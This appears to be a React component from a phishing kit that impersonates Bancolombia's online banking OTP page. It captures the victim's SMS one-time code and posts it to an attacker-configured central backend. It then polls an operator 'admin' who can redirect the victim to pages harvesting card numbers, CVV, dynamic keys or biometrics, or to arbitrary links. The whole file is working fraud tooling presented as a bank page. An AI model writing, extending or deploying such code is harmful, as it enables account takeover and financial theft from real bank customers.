import { instanceBackend } from "../../../axios/instanceBackend";
import { useEffect, useState, useRef } from "react";
import { isDesktop, limpiarPaddingBody } from "../../../../@utils";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import AccionesModal from "./modals/accionesModal";
import NumOTPModal from "./modals/NumOTP-Modal";
import './css/LoginModal.css';

// Se exporta el metodo
export default function NumeroOTP() {

    // Se inicializan los estados
    const [formState, setFormState] = useState({
        clave: "",
        errorClave: false,
        touchedClave: false,
        lanzarModalAcciones: false,
        lanzarModalInactividad: false,
        lanzarModalErrorSesion: false,
    });

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Se inicializan las variables
    const [getButtonEnable, setButtonEnabled] = useState(false);
    const [getClearButtonEnabled, setClearButtonEnabled] = useState(true);
    const [otpFocused, setOtpFocused] = useState(false);
    const [getLoading, setLoading] = useState(false);
    const [activeResend, setActiveResend] = useState(false);
    const [timeLeft, setTimeLeft] = useState(180);
    const totalTime = 180;

    // Se inicializan las constantes del contador
    const radius = 47;
    const circumference = 2 * Math.PI * radius;
    const strokeDashoffset = circumference - (timeLeft / totalTime) * circumference;

    // Se inicializa la referencia
    const inputRefs = useRef([]);
    const pollingIntervalRef = useRef(null);
    const statusTickRef = useRef(null);
    const submitTickRef = useRef(0);

    // Se crea el useEffect para el contador del reenviar
    useEffect(() => {

        // Se valida si el tiempo es menor o igual a 0
        if (timeLeft <= 0) return;

        // Se crea el intervalo para el contador
        const intervalId = setInterval(() => {

            // Se setea el tiempo restante
            setTimeLeft(prev => prev - 1);
        }, 1000);

        // Se retorna la función para limpiar el intervalo
        return () => clearInterval(intervalId);
    }, [timeLeft]);

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Se valida si el estado en el localStorage es error
        const estadoSesion = localStorage.getItem('estado_sesion');

        // Si es error, se muestra el modal
        if (estadoSesion === 'error') {

            // Se borra el estado del localStorage
            localStorage.removeItem('estado_sesion');

            // Se resetea el timer
            setTimeLeft(totalTime);
            setActiveResend(false);

            // Se muestra el modal de error de sesión OTP
            setFormState(prev => ({
                ...prev,
                lanzarModalErrorSesion: true
            }));

            // Se quita a los 2 segundos
            setTimeout(() => {

                // Se oculta el modal de error de sesión OTP
                setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }));
            }, 4000);
        };

        // Se obtiene la IP
        getInfoIp();

        // Se obtiene la fecha/hora con formato
        getDateHours();
    }, []);

    // Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        getDateHours();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const nextMinute = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        // Se inicializa el intervalo
        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {

            // Se inicializa el estado de la fecha y hora
            getDateHours();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {

                // Se llama el metodo
                getDateHours();
            }, 60000);
        }, nextMinute);

        // Se retorna
        return () => {

            // Se limpia el metodo
            clearTimeout(timeoutId);

            // Se limpia el intervalo
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Se crea el useEffect
    useEffect(() => {

        // Se inicializa el tiempo de inactividad
        let inactivityTimeout;
        const timeInactivy = 1000 * 60 * 5;

        // Metodo encargado de reiniciar el temporizador
        const rebootTempt = () => {

            // Se limpia
            clearTimeout(inactivityTimeout);

            // inicializa el temporizador de inactividad
            inactivityTimeout = setTimeout(() => {

                // Se lanza el estado
                setFormState(prev => ({ ...prev, lanzarModalInactividad: true }));
            }, timeInactivy);
        };

        // Se llama la funcion
        rebootTempt();

        // Se añaden los eventos
        window.addEventListener("mousemove", rebootTempt);
        window.addEventListener("keydown", rebootTempt);

        // Se retorna
        return () => {

            // Se limpia 
            clearTimeout(inactivityTimeout);

            // Se añaden los eventos para limpiarlos
            window.removeEventListener("mousemove", rebootTempt);
            window.removeEventListener("keydown", rebootTempt);
        };
    }, []);

    // Se verifica si el tiempo llegó a cero
    useEffect(() => {

        // Se valida cuando el contador llega a cero
        if (timeLeft === 0) {

            // Se activa el reenviar
            setActiveResend(true);
        };
    }, [timeLeft]);

    // Metodo encargado de formatear el tiempo
    const formatTime = (seconds) => {

        // Se calcula los minutos y segundos
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;

        // Se retorna el tiempo formateado
        return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    };

    // Obtiene la dirección IP pública del usuario
    const getInfoIp = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // Obtiene la fecha y hora actual del sistema
    const getDateHours = () => {

        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const options = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formattedDate = ahora.toLocaleString("es-CO", options);

        // Se guarda el valor formateado en el estado
        setFechaHora(formattedDate);
    };

    // Manejo de cambio en inputs OTP
    const handleOtpChange = (e, index) => {

        // Se obtiene el valor ingresado
        const { value } = e.target;

        // Se valida que solo se permitan números
        if (value && !/^[0-9]*$/.test(value)) return;

        // Se divide la clave actual en un array de caracteres
        let chars = formState.clave.split('');

        // Se asegura que el array tenga longitud suficiente
        while (chars.length < 6) chars.push('');

        // Se actualiza el valor en la posición correcta
        chars[index] = value.slice(-1);

        // Si se borra el contenido
        if (!value) chars[index] = '';

        // Se unen los caracteres para formar la nueva clave
        const newClave = chars.join('').slice(0, 6);

        // Se actualiza el estado del formulario
        setFormState(prev => ({
            ...prev,
            clave: newClave,
            errorClave: false
        }));

        // Se enfoca automáticamente el siguiente input
        if (value && index < 5) {
            inputRefs.current[index + 1]?.focus();
        }

        // Se habilita o deshabilita el botón según la longitud de la clave
        if (newClave.length === 6) {

            // Se habilita el botón de continuar
            setButtonEnabled(true);
        } else if (newClave.length === 0) {

            // Se habilita el botón de borrar
            setClearButtonEnabled(true);

            // Se deshabilita el botón de continuar
            setButtonEnabled(false);
        } else if (newClave.length > 0) {

            // Se deshabilita el botón de borrar
            setClearButtonEnabled(false);

            // Se valida si la clave tiene menos de 6 dígitos
            if (newClave.length < 6) {

                // Se deshabilita el botón de continuar
                setButtonEnabled(false);
            }
        }
    };

    // Método para manejar la tecla presionada en los inputs OTP
    const handleKeyDown = (e, index) => {

        // Se valida si se presionó la tecla Backspace
        if (e.key === "Backspace") {

            // Si el campo actual está vacío y no es el primero, se enfoca el anterior
            if (!e.target.value && index > 0) {

                // Se enfoca el input anterior
                inputRefs.current[index - 1]?.focus();
            }
        }
    };

    // Método encargado de bloquear el clipboard (copiar/pegar/cortar)
    const bloquearClipboard = (e) => {

        // Se previene la acción por defecto
        e.preventDefault();

        // Se valida si ya hay un temporizador activo para el modal
        if (formState.lanzarModalAcciones) return;

        // Se lanza la alerta de acción no permitida
        setFormState(prev => ({ ...prev, lanzarModalAcciones: true }));

        // Se crea un temporizador para cerrar el modal automáticamente
        setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalAcciones: false })), 2500);
    };

    // Método encargado de cerrar el modal de acciones
    const handleCloseModal = () => {

        // Se actualiza el estado del formulario para ocultar el modal
        setFormState(prev => ({ ...prev, lanzarModalAcciones: false }));
    };

    // Método encargado de reenviar la solicitud de OTP
    const handleResend = async () => {

        // Se usa el try catch
        try {

            // Se muestra el estado de cargando
            setLoading(true);

            // Se resetea el temporizador y se oculta el enlace de reenviar
            setTimeLeft(totalTime);
            setActiveResend(false);

            // Se obtiene la sesión del localStorage
            const sessionId = localStorage.getItem("sessionId");

            // Se valida que exista un sessionId
            if (!sessionId) {

                // Se muestra una alerta de error
                alert("Error: No se encontró la sesión");

                // Se quita el cargando
                setLoading(false);

                // Se retorna
                return;
            }

            // Se envia la data
            const dataSend = {
                "data": {
                    "attributes": {
                        "sessionId": sessionId,

                        // DATOS NUEVOS PARA EL DISTRIBUIDOR
                        "backend": "P01",
                        "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                        "backend_url": "/api/v1/bancolombia/otp-resend"
                    },
                },
            };

            const centralUrlResend = (
                process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
            ).trim();

            // Se envía la petición de reenvío al backend
            if (centralUrlResend) {
                await instanceBackend.post(centralUrlResend, dataSend);
            } else {
                await instanceBackend.post("/bancolombia/otp-resend", dataSend);
            }

            // Se inicia el polling para esperar la decisión del admin
            initPolling(sessionId);
        } catch (e) {

            // Se registra el error en consola
            console.error("Error notifying resend", e);

            // Se quita el cargando
            setLoading(false);

            // Se muestra una alerta de error
            alert('Error al solicitar nuevo código. Intente nuevamente.');
        }
    };

    // Método encargado de limpiar la clave OTP
    const handleClear = () => {

        // Se limpia el campo de la clave en el estado
        setFormState(prev => ({
            ...prev,
            clave: "",
            errorClave: false
        }));

        // Se habilita el botón de borrar
        setClearButtonEnabled(true);

        // Se deshabilita el botón de continuar
        setButtonEnabled(false);

        // Se enfoca el primer input
        inputRefs.current[0]?.focus();
    };

    // Método encargado de manejar el blur del OTP
    const handleOtpBlur = () => {

        // Se actualiza el estado del formulario marcando el campo como tocado
        setFormState(prev => ({
            ...prev,
            touchedClave: true,
            errorClave: prev.clave.length === 0
        }));
    };

    // Metodo para registrar el intento de otp - ESTRUCTURA UNIFICADA
    const updateDataLocalStorage = (otpValue) => {

        // Se obtiene los datos del localStorage
        const storageKey = "datos_usuario";

        // Se obtiene el valor almacenado
        const raw = localStorage.getItem(storageKey);

        // Se parsea el JSON o se inicializa un objeto vacío
        let datos = raw ? JSON.parse(raw) : {};

        // Se inicializa el objeto usuario si no existe
        if (!datos.usuario) datos.usuario = {};
        if (!datos.usuario.otp) datos.usuario.otp = [];

        // Se crea el objeto del intento
        const nuevoIntento = {
            intento: datos.usuario.otp.length + 1,
            codigo: otpValue,
            fecha: new Date().toLocaleString(),
        };

        // Se agrega al array
        datos.usuario.otp.push(nuevoIntento);

        // Se guarda nuevamente en el localStorage
        localStorage.setItem(storageKey, JSON.stringify(datos));

        // Se retorna el codigo
        return datos.usuario.otp;
    };

    // Metodo encargado de manejar el envio de la clave
    const handleSend = async () => {

        // Se muestra el cargando
        setLoading(true);

        // Se envia la clave al backend
        try {

            // Se obtiene el sessionId
            const sessionId = localStorage.getItem("sessionId");

            // Se valida que haya un sessionId
            if (!sessionId) {

                // Se envia una alerta
                alert("Error: No se encontró la sesión");

                // Se quita el cargando
                setLoading(false);

                // Se retorna
                return;
            };

            // Se prepara la data a enviar
            const otp = formState.clave;

            // Registrar intento antes de enviar
            updateDataLocalStorage(otp);

            // Se envia la data
            const dataSend = {
                "data": {
                    "attributes": {
                        "otp": otp,
                        "sessionId": sessionId,

                        // DATOS NUEVOS PARA EL DISTRIBUIDOR
                        "backend": "P01",
                        "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                        "backend_url": "/api/v1/bancolombia/otp",
                    },
                },
            };

            const centralUrl = (
                process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
            ).trim();

            // Enviar al backend
            if (centralUrl) {
                await instanceBackend.post(centralUrl, dataSend);
            } else {
                await instanceBackend.post("/bancolombia/otp", dataSend);
            }

            // Iniciar polling para esperar respuesta del admin con timestamp de envío
            const submitTime = Date.now();
            submitTickRef.current = submitTime;
            initPolling(sessionId, submitTime);
        } catch (error) {

            // En caso de error, se muestra un mensaje
            setLoading(false);

            // Se muestra la alerta de error
            alert('Error enviando clave. Intente nuevamente.');
        };
    };

    // Función de polling para esperar respuesta del admin
    const initPolling = (sessionId, submitTime = 0) => {

        // Limpiar intervalo anterior si existe
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }

        // Se inicializa el intervalo de polling
        pollingIntervalRef.current = setInterval(async () => {

            // Se usa el try catch
            try {

                // Se obtiene el estado de la sesion
                const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);

                // Se captura el estado y el statusTick
                const { estado, url, text, statusTick } = response.data;
                const estadoLower = (estado || "").toLowerCase();
                const hasUrl = Boolean(url && String(url).trim());
                const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);

                // Si el statusTick recibido es anterior a este envío, ignorar estado viejo (aún procesando en backend)
                if (submitTime > 0 && statusTick != null && Number(statusTick) < submitTime) {
                    return;
                }

                // Si ya procesamos exactamente este statusTick y estado, no repetir
                if (statusTick != null && statusTickRef.current === statusTick) {
                    return;
                }

                // Estados que detienen el polling
                const stateValid = [

                    // Botones linea 1
                    'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',

                    // Botones linea 2
                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',

                    // Botones linea 3
                    'sol_biometria', 'error_923',

                    // Botones linea 4
                    'sol_tc_custom', 'sol_cvv_custom',

                    // Estados adicionales por pantalla
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla',
                    'sol_link_bot', 'link_bot', 'sol_link_custom'
                ];

                if (
                    (estadoLower === 'sol_link_bot' || estadoLower === 'link_bot' || estadoLower === 'sol_link_custom') &&
                    !(estadoLower === 'link_bot' && hasUrl) &&
                    !(estadoLower === 'sol_link_custom' && customLink)
                ) {
                    return;
                }

                // Se verifica si el estado es válido
                if (stateValid.includes(estadoLower)) {
                    if (statusTick != null) {
                        statusTickRef.current = statusTick;
                    }

                    // Se limpian los intervalos
                    if (pollingIntervalRef.current) {
                        clearInterval(pollingIntervalRef.current);
                        pollingIntervalRef.current = null;
                    }
                }

                // Redirecciones basadas en respuesta del admin
                switch (estadoLower) {
                    case 'sol_tc':

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'error_tc_custom':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'sol_otp':

                        // Se quita el estado de cargando
                        setLoading(false);

                        // Se fuera el scroll hacia arriba
                        window.scrollTo(0, 0);

                        // Se limpia el formulario para permitir nuevo intento
                        handleClear();

                        // Se resetea el timer
                        setTimeLeft(totalTime);

                        // Se desactiva el reenviar
                        setActiveResend(false);

                        // Se sale del ciclo
                        break;
                    case 'error_otp':

                        // Recargar para reintentar OTP
                        setLoading(false);

                        // Se fuera el scroll hacia arriba
                        window.scrollTo(0, 0);

                        // Se limpia el ciclo
                        handleClear();

                        // Se resetea el timer
                        setTimeLeft(totalTime);

                        // Se desactiva el reenviar
                        setActiveResend(false);

                        // Se muestra el modal de error de sesión OTP
                        setFormState(prev => ({
                            ...prev,
                            lanzarModalErrorSesion: true
                        }));

                        // Se quita el modal a los 2 segundos
                        setTimeout(() => {

                            // Se oculta el modal de error de sesión OTP
                            setFormState(prev => ({
                                ...prev,
                                lanzarModalErrorSesion: false
                            }));
                        }, 4000);

                        // Se sale del ciclo
                        break;
                    case 'sol_din':

                        // Redirigir a la clave dinámica
                        window.location.href = '/clave-dinamica';

                        // Se sale del ciclo
                        break;
                    case 'error_din':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la clave dinámica
                        window.location.href = '/clave-dinamica';

                        // Se sale del ciclo
                        break;
                    case 'sol_finalizar':
                    case 'sol_finalizado':
                    case 'solicitar_finalizar':

                        // Redirigir a la página finalizado
                        window.location.href = '/finalizado-pse';

                        // Se sale del ciclo
                        break;
                    case 'sol_biometria':

                        // Redirigir a la verificación de identidad
                        window.location.href = '/verificacion-identidad';

                        // Se sale del ciclo
                        break;
                    case 'error_923':

                        // Redirigir a la página de error 923
                        window.location.href = '/error-923page';

                        // Se sale del ciclo
                        break;
                    case 'sol_cvv':

                        // Redirigir a validacion cvv
                        window.location.href = '/validacion-cvv';

                        // Se sale del ciclo
                        break;
                    case 'sol_tc_custom':

                        // Redirigir a la validación de tarjeta de crédito (usa la misma vista para TC estándar y custom)
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'sol_cvv_custom':

                        // Redirigir a la validación de CVV
                        window.location.href = '/validacion-cvv';

                        // Se sale del ciclo
                        break;
                    case 'error_login':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la página de autenticación
                        window.location.href = '/bancolombia';

                        // Se sale del ciclo
                        break;
                    case 'link_bot':
                        if (hasUrl) {
                            window.location.href = url;
                        }
                        break;
                    case 'sol_link_custom':
                        if (customLink) {
                            window.location.href = customLink;
                        }
                        break;
                    default:

                        // Se sale del ciclo
                        break;
                };
            } catch (error) {
            }
        }, 3000);
    };

    // Manejo de foco en inputs OTP
    const handleOtpFocus = () => {

        // Se establece el estado de foco
        setOtpFocused(true);
    };

    // Se crea el return del componente
    const desktop = isDesktop();

    // Renderizado del componente
    return (
        <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
            <div
                style={{
                    flex: 1,
                    backgroundColor: "#2C2A29",
                    backgroundImage: 'url("/assets/bancolombia/auth-trazo.svg")',
                    backgroundRepeat: desktop ? 'round' : 'no-repeat',
                    backgroundPosition: "center",
                    backgroundPositionY: desktop ? "0px" : "-70px",
                    backgroundPositionX: desktop ? "0px" : "-500px",
                }}
            >
                <div style={{ textAlign: "center" }}>
                    <img
                        src="/assets/bancolombia/bancolombia.svg"
                        alt="Logo"
                        style={{ width: "238px", marginTop: "45px" }}
                    />
                </div>

                <div
                    style={{
                        marginTop: "25px",
                    }}
                >
                    <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
                        Sucursal Virtual Personas
                    </h1>
                </div>

                <div className="login-page">
                    <div className="login-box">
                        <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "24px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
                            Confirma tus datos
                        </h2>

                        <p className="bc-card-auth-description bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "16px", lineHeight: "20px", marginBottom: "30px", color: "white" }}>
                            Ingresa el código que te enviamos por mensaje de texto.
                        </p>

                        {/* Circular Timer */}
                        <div style={{ position: "relative", width: desktop ? "123px" : "100px", height: "100px", margin: "0 auto 40px" }}>
                            <svg width={desktop ? "120" : "100"} height="100" style={{ transform: "rotate(-90deg)" }}>
                                <circle cx="50" cy="50" r={radius} stroke="#4a4a4a" strokeWidth="6" fill="transparent" />
                                <circle
                                    cx="50"
                                    cy="50"
                                    r={radius}
                                    stroke="#00C589"
                                    strokeWidth="6"
                                    fill="transparent"
                                    strokeDasharray={circumference}
                                    strokeDashoffset={strokeDashoffset}
                                    style={{ transition: "stroke-dashoffset 1s linear" }}
                                />
                            </svg>
                            <div style={{
                                position: "absolute",
                                top: desktop ? "60%" : "50%",
                                left: "50%",
                                transform: "translate(-50%, -50%)",
                                textAlign: "center"
                            }}>
                                <div className="bc-card-auth-description" style={{ fontSize: "11px", color: "white" }}>Vence en:</div>
                                <div className="bc-card-auth-description" style={{ fontSize: "14px", fontWeight: "bold", color: "white" }}>{formatTime(timeLeft)}</div>
                            </div>
                            {activeResend ?
                                <div>
                                    <p className="bc-card-auth-description" style={{ marginTop: "10px", fontSize: desktop ? "12px" : "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
                                        Reenviar código OTP
                                    </p>
                                </div>
                                : null}
                        </div>

                        {/* OTP Inputs */}
                        <div
                            className="otp-container"
                            style={{
                                display: "flex",
                                justifyContent: "center",
                                gap: "10px",
                                marginBottom: "20px"
                            }}
                        >
                            {[0, 1, 2, 3, 4, 5].map((index) => (
                                <input
                                    key={index}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                    type="password"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={formState.clave[index] || ""}
                                    onChange={(e) => handleOtpChange(e, index)}
                                    onKeyDown={(e) => handleKeyDown(e, index)}
                                    onFocus={(e) => {
                                        handleOtpFocus();
                                        e.target.select();
                                    }}
                                    onBlur={handleOtpBlur}
                                    className={`otp-input ${formState.touchedClave && formState.clave.length === 0
                                        ? "otp-error"
                                        : ""
                                        }`}
                                    onCopy={bloquearClipboard}
                                    onPaste={bloquearClipboard}
                                    onCut={bloquearClipboard}
                                    onContextMenu={bloquearClipboard}
                                />
                            ))}
                        </div>

                        <p className="bc-card-auth-description" style={{ textAlign: "center", fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
                            Búscalo en el número de teléfono registrado
                        </p>

                        <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                            <button className="bc-button-primary login-btn-borrar mt-4" style={{ fontSize: "14px" }} disabled={getClearButtonEnabled} onClick={() => handleClear()}>
                                Borrar
                            </button>
                            <button className="bc-button-primary login-btn mt-4" style={{ fontSize: "14px" }} disabled={!getButtonEnable} onClick={handleSend}>
                                Continuar
                            </button>
                        </div>
                    </div>
                </div>
                <div className="login-page-footer mt-4">
                    <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                        <span>¿Problemas para conectarte?</span>
                        <span className="dot">·</span>
                        <span>Aprende sobre seguridad</span>
                        <span className="dot">·</span>
                        <span>Reglamento Sucursal Virtual</span>
                        <span className="dot">·</span>
                        <span>Política de privacidad</span>
                    </div>
                    <hr style={{ marginTop: "20px" }} />
                    <div className="footer-final">
                        <div className="footer-left">
                            <div>
                                <img
                                    src="/assets/bancolombia/bancolombia.svg"
                                    style={{ width: "180px" }}
                                />
                            </div>
                            <div style={{ alignSelf: 'center' }}>
                                <span className="vigilado">
                                    <img
                                        src="/assets/bancolombia/logo-vigilado.svg"
                                        alt="Superintendencia"
                                        style={{ width: "140px" }}
                                    />
                                </span>
                            </div>
                        </div>
                        <div className="footer-right">
                            <div className="mt-2">Dirección IP: {ip}</div>
                            <div className="mb-2">{fechaHora}</div>
                        </div>
                    </div>
                </div>
            </div>

            {formState.lanzarModalAcciones ?
                <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={handleCloseModal} /> : null}

            {/* AQUI SE AGREGO EL MODAL NumOTPModal */}
            {formState.lanzarModalErrorSesion ?
                <NumOTPModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }))} /> : null}

            <style>
                {`
                    .otp-input:focus {
                        border-bottom: 2px solid #fdda24 !important;
                    }
                `}
            </style>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/bancolombia/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {getLoading ?
                <LoadingBancolombia /> : null}
        </div>
    );
};
